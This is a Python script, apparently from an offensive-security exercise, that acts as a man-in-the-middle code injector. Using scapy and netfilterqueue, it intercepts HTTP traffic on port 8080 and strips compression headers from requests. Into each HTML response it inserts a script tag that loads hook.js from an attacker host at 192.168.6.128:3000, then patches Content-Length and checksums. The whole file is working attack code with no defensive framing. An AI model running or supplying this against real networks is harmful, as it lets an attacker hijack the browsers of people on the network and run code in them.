import scapy.all as scapy
import netfilterqueue
import time
import re

def set_load(packet,load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet


def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
		load = str(scapy_packet[scapy.Raw].load)
		if scapy_packet[scapy.TCP].dport == 8080:
			print("[+] Request")
			load = re.sub(r'Accept-Encoding:.*?\\r\\n',"",load)
			load = load.replace("HTTP/1.1","HTTP/1.0")


		elif scapy_packet[scapy.TCP].sport == 8080:
			print("[+] Responce ")
			injection_code = '<script src="http://192.168.6.128:3000/hook.js">alert("script injected successfully")</script>'
			load = load.replace("</body>",f"{injection_code}</body>")
			content_length_search = re.search('(?:Content-Length:\s)(\d*)',load)
			if content_length_search and "text/html" in load:
				content_length = content_length_search.group(1)
				new_content_length = int(content_length)+ len(injection_code)
				load = load.replace(content_length,str(new_content_length))
		
		if load!= scapy_packet[scapy.Raw].load:
			new_packet = set_load(scapy_packet,load)
			packet.set_payload(bytes(new_packet))
			


	packet.accept() 

queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()

